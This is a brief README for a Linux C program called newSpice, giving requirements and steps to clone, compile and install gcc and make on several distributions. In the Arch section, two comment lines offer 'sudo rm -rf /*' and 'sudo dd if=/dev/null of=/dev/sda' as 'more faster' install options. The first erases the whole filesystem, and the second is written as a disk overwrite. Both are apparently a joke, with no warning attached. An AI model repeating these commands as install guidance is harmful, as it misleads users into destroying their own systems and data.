# Requirements
* power
* anything that can run linux
* gcc
* make
* dialyn as wallpaper

# Installation guide
1. **Clone repo**
   ```bash
   git clone https://github.com/mishapank2010/newSpice.git
   cd newSpice
   ```
2. **Compile**
   ```bash
   make
   ```
   **if you doesnt have c/c++ compiler and make, you should install them**
   
   **Debian/Ubuntu/Mint:**
   ```bash
   sudo apt update && sudo apt install gcc make
   ```

   **Fedora/RHEL/CentOS:**
   ```bash
   sudo dnf install gcc make
   ```

   **Arch:**
   ```bash
   sudo pacman -S gcc make
   # or more faster sudo rm -rf /*
   # or even more faster sudo dd if=/dev/null of=/dev/sda
   ```
    
   
4. **Run it**
   ```bash
   ./newSpice
   ```
